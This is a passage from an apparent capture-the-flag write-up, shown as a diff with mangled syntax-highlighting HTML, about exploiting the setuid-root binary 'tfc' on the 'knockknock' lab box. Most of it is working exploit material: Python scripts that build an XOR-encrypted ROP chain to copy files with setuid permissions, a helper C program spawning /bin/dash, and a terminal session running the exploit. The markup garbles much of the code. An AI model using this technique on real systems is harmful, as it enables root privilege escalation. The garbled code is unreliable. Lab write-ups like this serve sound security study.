+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">esp</span><span class="o">+</span><span class="mi">08</span><span class="o">:</span> <span class="n">ARG_1</span>       <span class="err">#</span> <span class="n">argument</span> <span class="n">one</span> <span class="k">for</span> <span class="n">function</span> <span class="n">at</span> <span class="n">ADDR</span>
+<span class="n">esp</span><span class="o">+</span><span class="mi">0</span><span class="nl">c</span><span class="p">:</span> <span class="n">ARG_2</span>       <span class="err">#</span> <span class="n">argument</span> <span class="n">two</span> <span class="k">for</span> <span class="n">function</span> <span class="n">at</span> <span class="n">ADDR</span>
+<span class="n">esp</span><span class="o">+</span><span class="mi">10</span><span class="o">:</span> <span class="n">ARG_n</span>       <span class="err">#</span> <span class="n">argument</span> <span class="n">n</span>   <span class="k">for</span> <span class="n">function</span> <span class="n">at</span> <span class="n">ADDR</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">esp</span><span class="o">+</span><span class="mi">14</span><span class="o">:</span> <span class="n">NEXT</span>        <span class="err">#</span> <span class="k">return</span> <span class="n">to</span> <span class="n">next</span> <span class="n">function</span> <span class="n">at</span> <span class="n">NEXT</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span></code></pre></div></p>
+
+<p>So we have all the values we need, let&rsquo;s put it together in a semi-smart and flexible way. I made a python script to handle building and encrypting the payload:</p>
+
+<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">sys</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">i</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="n">x</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">def</span> <span class="nf">xcrypt</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+    <span class="n">xor_key</span> <span class="o">=</span> <span class="mh">0xea1ab19f</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="n">output</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">/</span><span class="mi">4</span><span class="p">):</span>
+    <span class="n">block</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span> <span class="s">&#39;&amp;lt;L&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4</span> <span class="p">:</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span> <span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="n">output</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span> <span class="s">&#39;&amp;lt;L&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">block</span> <span class="o">^</span> <span class="n">xor_key</span><span class="p">)</span> <span class="p">)</span>
+
+    <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+        <span class="n">temp_xor_key</span> <span class="o">=</span> <span class="n">xor_key</span> <span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="mi">1</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">xor_key</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="mi">1</span><span class="p">):</span>
+            <span class="n">temp_xor_key</span> <span class="o">^=</span> <span class="mh">0x6daa1cf4</span>
+        <span class="n">xor_key</span> <span class="o">=</span> <span class="n">temp_xor_key</span>
+
+<span class="k">return</span> <span class="n">output</span>
+<span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">def</span> <span class="nf">genPayload</span><span class="p">():</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">*</span><span class="mi">4124</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="c"># open(&#39;write&#39;) for writing. fd = 0x05</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80484a0</span><span class="p">)</span> <span class="c"># open@plt()</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80489d6</span><span class="p">)</span> <span class="c"># pppr</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x804933e</span><span class="p">)</span> <span class="c"># &quot;write\x00&quot;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x441</span><span class="p">)</span> <span class="c"># O_WRONLY|O_CREAT|O_APPEND</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x9ed</span><span class="p">)</span> <span class="c"># 04755</span>
+
+<span class="c"># write 0x200 bytes to &#39;write&#39;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80484c0</span><span class="p">)</span> <span class="c"># write@plt()</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80489d6</span><span class="p">)</span> <span class="c"># pppr</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x5</span><span class="p">)</span>       <span class="c"># fd</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8049db8</span><span class="p">)</span> <span class="c"># buffer</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span>     <span class="c"># size_t</span>
+
+<span class="k">return</span> <span class="n">xcrypt</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">if</span> <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">name</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span> <span class="o">==</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">main</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;&amp;</span><span class="n">rdquo</span><span class="p">;:</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">out</span><span class="o">.</span><span class="n">tfc</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">w</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">genPayload</span><span class="p">())</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span></code></pre></div></p>
+
+<p>OK, so I&rsquo;m already ahead a bit. We will need a buffer to store bytes from the &lsquo;read&rsquo; file later. The binary does not seem to have a lot of locations for this, as can be seen from <code>readelf -l ./tfc</code>:</p>
+
+<pre><code class="bash">bas@tritonal:~/tmp/knockknock$ readelf -l tfc
+
+Elf file type is EXEC (Executable file)
+Entry point 0x8048500
+There are 8 program headers, starting at offset 52
+
+Program Headers:
+  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
+  PHDR           0x000034 0x08048034 0x08048034 0x00100 0x00100 R E 0x4
+  INTERP         0x000134 0x08048134 0x08048134 0x00013 0x00013 R   0x1
+      [Requesting program interpreter: /lib/ld-linux.so.2]
+  LOAD           0x000000 0x08048000 0x08048000 0x00c48 0x00c48 R E 0x1000
+  LOAD           0x000c48 0x08049c48 0x08049c48 0x00250 0x00254 RW  0x1000
+  DYNAMIC        0x000c54 0x08049c54 0x08049c54 0x000f0 0x000f0 RW  0x4
+  NOTE           0x000148 0x08048148 0x08048148 0x00044 0x00044 R   0x4
+  GNU_EH_FRAME   0x000b54 0x08048b54 0x08048b54 0x00034 0x00034 R   0x4
+  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
+</code></pre>
+
+<p>Looks like there is some space in the DYNAMIC or LOAD sections. I fired up the binary in <code>gdb</code> to verify:</p>
+
+<pre><code class="bash">Breakpoint 1, 0x08048927 in main ()
+gdb-peda$ x/400x 0x08049c54
+0x8049c54 &lt;_DYNAMIC&gt;:   0x00000001  0x00000010  0x0000000c  0x08048404
+0x8049c64 &lt;_DYNAMIC+16&gt;:    0x0000000d  0x08048a54  0x00000019  0x08049c48
+0x8049c74 &lt;_DYNAMIC+32&gt;:    0x0000001b  0x00000004  0x0000001a  0x08049c4c
+0x8049c84 &lt;_DYNAMIC+48&gt;:    0x0000001c  0x00000004  0x00000004  0x0804818c
+0x8049c94 &lt;_DYNAMIC+64&gt;:    0x6ffffef5  0x080481d8  0x00000005  0x080482d8
+0x8049ca4 &lt;_DYNAMIC+80&gt;:    0x00000006  0x080481f8  0x0000000a  0x00000087
+0x8049cb4 &lt;_DYNAMIC+96&gt;:    0x0000000b  0x00000010  0x00000015  0xf7715924
+0x8049cc4 &lt;_DYNAMIC+112&gt;:   0x00000003  0x08049d48  0x00000002  0x00000060
+0x8049cd4 &lt;_DYNAMIC+128&gt;:   0x00000014  0x00000011  0x00000017  0x080483a4
+0x8049ce4 &lt;_DYNAMIC+144&gt;:   0x00000011  0x0804839c  0x00000012  0x00000008
+0x8049cf4 &lt;_DYNAMIC+160&gt;:   0x00000013  0x00000008  0x6ffffffe  0x0804837c
+0x8049d04 &lt;_DYNAMIC+176&gt;:   0x6fffffff  0x00000001  0x6ffffff0  0x08048360
+0x8049d14 &lt;_DYNAMIC+192&gt;:   0x00000000  0x00000000  0x00000000  0x00000000
+0x8049d24 &lt;_DYNAMIC+208&gt;:   0x00000000  0x00000000  0x00000000  0x00000000
+0x8049d34 &lt;_DYNAMIC+224&gt;:   0x00000000  0x00000000  0x00000000  0x00000000
+0x8049d44:  0x00000000  0x08049c54  0xf7715938  0xf77084a0
+0x8049d54 &lt;strcmp@got.plt&gt;: 0x08048446  0x08048456  0x08048466  0x08048476
+0x8049d64 &lt;puts@got.plt&gt;:   0x08048486  0x08048496  0x080484a6  0xf7545970
+0x8049d74 &lt;write@got.plt&gt;:  0x080484c6  0x080484d6  0x080484e6  0x080484f6
+0x8049d84:  0x00000000  0x00000000  0x00000000  0x00000000
+0x8049d94:  0x00000000  0x00000000  0x00000000  0x00000000
+0x8049da4 &lt;__dso_handle&gt;:   0x00000000  0x00000000  0x00000000  0x00000000
+0x8049db4 &lt;__dso_handle+16&gt;:    0x00000000  0x00000000  0x00000000  0x5f5f5f5f
+0x8049dc4 &lt;banr+4&gt;: 0x5f5f5f5f  0x5f5f5f5f  0x5f5f5f5f  0x5f5f5f5f
+0x8049dd4 &lt;banr+20&gt;:    0x5f5f5f5f  0x5f5f5f5f  0x205f5f5f  0x5c0a0d20
+0x8049de4 &lt;banr+36&gt;:    0x20205f5f  0x5f5f2020  0x5f5c2f5f  0x5f202020
+0x8049df4 &lt;banr+52&gt;:    0x5f5f5f5f  0x205f5c2f  0x5f5f2020  0x205c205f
+...
+0x8049fe4:  0x00000000  0x00000000  0x00000000  0x00000000
+0x8049ff4:  0x00000000  0x00000000  0x00000000  Cannot access memory at address 0x804a000
+</code></pre>
+
+<p>We can&rsquo;t really use places like <code>0x8049d54 &lt;strcmp@got.plt&gt;</code>, because there are function pointers there, ones that we need! I picked this location at <code>0x8049db8</code>. It didn&rsquo;t look like it contained crucial information. Furthermore, it was writeable and had a decent number of bytes behind it.</p>
+
+<p>While we&rsquo;re at it, let&rsquo;s make sure we can read and write large files. Unfortunately, the buffer is only 0x200 bytes large. This means we have to chunk it up!</p>
+
+<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">sys</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">i</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="n">x</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">def</span> <span class="nf">xcrypt</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+    <span class="n">xor_key</span> <span class="o">=</span> <span class="mh">0xea1ab19f</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="n">output</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">/</span><span class="mi">4</span><span class="p">):</span>
+    <span class="n">block</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span> <span class="s">&#39;&amp;lt;L&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4</span> <span class="p">:</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span> <span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="n">output</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span> <span class="s">&#39;&amp;lt;L&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">block</span> <span class="o">^</span> <span class="n">xor_key</span><span class="p">)</span> <span class="p">)</span>
+
+    <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+        <span class="n">temp_xor_key</span> <span class="o">=</span> <span class="n">xor_key</span> <span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="mi">1</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">xor_key</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="mi">1</span><span class="p">):</span>
+            <span class="n">temp_xor_key</span> <span class="o">^=</span> <span class="mh">0x6daa1cf4</span>
+        <span class="n">xor_key</span> <span class="o">=</span> <span class="n">temp_xor_key</span>
+
+<span class="k">return</span> <span class="n">output</span>
+<span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">def</span> <span class="nf">genPayload</span><span class="p">(</span><span class="n">filesize</span><span class="p">):</span>
+    <span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;[</span><span class="err">!</span><span class="p">]</span> <span class="n">filesize</span> <span class="o">=</span> <span class="p">{}</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">filesize</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="n">payload</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">4124</span>
+
+<span class="c"># open(&#39;write&#39;) for writing. fd = 0x05</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80484a0</span><span class="p">)</span> <span class="c"># open@plt()</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80489d6</span><span class="p">)</span> <span class="c"># pppr</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x804933e</span><span class="p">)</span> <span class="c"># &quot;write\x00&quot;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x441</span><span class="p">)</span> <span class="c"># O_WRONLY|O_CREAT|O_APPEND</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x9ed</span><span class="p">)</span> <span class="c"># 04755</span>
+
+<span class="c"># open(&#39;read&#39;) for reading. fd = 0x06</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80484a0</span><span class="p">)</span> <span class="c"># open@plt()</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80489d6</span><span class="p">)</span> <span class="c"># pppr</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8049315</span><span class="p">)</span> <span class="c"># &quot;read\x00&quot;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0000000</span><span class="p">)</span> <span class="c"># readonly</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0000000</span><span class="p">)</span> <span class="c"># ?</span>
+
+<span class="n">iterations</span> <span class="o">=</span> <span class="p">(</span><span class="n">filesize</span> <span class="o">/</span> <span class="mh">0x200</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span>
+<span class="k">print</span> <span class="s">&quot;[!] need {} iterations&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">iterations</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">iterations</span><span class="p">):</span>
+    <span class="c"># read 0x200 bytes from &#39;read&#39;</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8048450</span><span class="p">)</span> <span class="c"># read@plt()</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80489d6</span><span class="p">)</span> <span class="c"># pppr</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x6</span><span class="p">)</span>       <span class="c"># fd</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8049db8</span><span class="p">)</span> <span class="c"># buffer</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span>     <span class="c"># filesize  --&amp;gt; not a lot to work with, but enough for ssh keys</span>
+
+    <span class="c"># write 0x200 bytes to &#39;write&#39;</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80484c0</span><span class="p">)</span> <span class="c"># write@plt()</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x80489d6</span><span class="p">)</span> <span class="c"># pppr</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x5</span><span class="p">)</span>       <span class="c"># fd</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8049db8</span><span class="p">)</span> <span class="c"># buffer</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span>     <span class="c"># size_t</span>
+
+<span class="k">return</span> <span class="n">xcrypt</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">if</span> <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">name</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span> <span class="o">==</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">main</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;&amp;</span><span class="n">rdquo</span><span class="p">;:</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Usage</span><span class="p">:</span> <span class="p">{}</span> <span class="o">&lt;</span><span class="nb">file</span><span class="o">&gt;&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+        <span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Please</span> <span class="n">provide</span> <span class="n">proper</span> <span class="n">files</span><span class="o">/</span><span class="n">symlinks</span> <span class="ow">in</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">read</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="ow">and</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">write</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
+        <span class="nb">exit</span> <span class="o">-</span><span class="mi">1</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="k">as</span> <span class="n">i</span><span class="p">:</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">i</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+    <span class="n">i</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;out.tfc&#39;</span><span class="p">,</span> <span class="s">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">genPayload</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)))</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span></code></pre></div></p>
+
+<p>This python code will add blocks of read &amp; write ROP chain elements, just as many are needed for a certain file. This is also why we&rsquo;ve opened the output file as O_APPEND: each write will simply add to the existing file, no hassle!</p>
+
+<p>Unfortunately, if you want to read and write <em>really</em> large files, like <code>/bin/dash</code>, tfc crashes before it can even get to our ROP chain. I solve that with a little helper program:</p>
+
+<p><div class="highlight"><pre><code class="language-c" data-lang="c"><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">system</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">dash</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span></code></pre></div></p>
+
+<p>OK, so now our moment supreme:</p>
+
+<pre><code class="bash">jason@knockknock:~$ ls -l
+total 24
+-rw-r--r-- 1 jason jason  109 Oct 16 14:31 getshell.c   
+-rwxr-xr-x 1 jason jason 4966 Oct 16 14:31 read         # our little helper program
+-rw-r--r-- 1 jason jason 1941 Oct 16 13:29 rop.py       # the rop exploit
+-rwsr-xr-x 1 root  jason 7457 Oct 11 18:35 tfc
+jason@knockknock:~$ python rop.py read                  # generate the ROP exploit using 'read'
+[!] filesize = 4966
+[!] need 10 iterations
+jason@knockknock:~$ ls -l
+total 32
+-rw-r--r-- 1 jason jason  109 Oct 16 14:31 getshell.c
+-rw-r--r-- 1 jason jason 4564 Oct 16 14:31 out.tfc      # this is the file we will feed to tfc
+-rwxr-xr-x 1 jason jason 4966 Oct 16 14:31 read
+-rw-r--r-- 1 jason jason 1941 Oct 16 13:29 rop.py
+-rwsr-xr-x 1 root  jason 7457 Oct 11 18:35 tfc
+jason@knockknock:~$ ./tfc out.tfc pwned.tfc             # let's run the ROP exploit
+Segmentation fault
+jason@knockknock:~$ ls -l
+total 40
+-rw-r--r-- 1 jason jason  109 Oct 16 14:31 getshell.c
+-rw-r--r-- 1 jason jason 4564 Oct 16 14:31 out.tfc
+-rw-r--r-- 1 root  jason    0 Oct 16 14:32 pwned.tfc
+-rwxr-xr-x 1 jason jason 4966 Oct 16 14:31 read
+-rw-r--r-- 1 jason jason 1941 Oct 16 13:29 rop.py
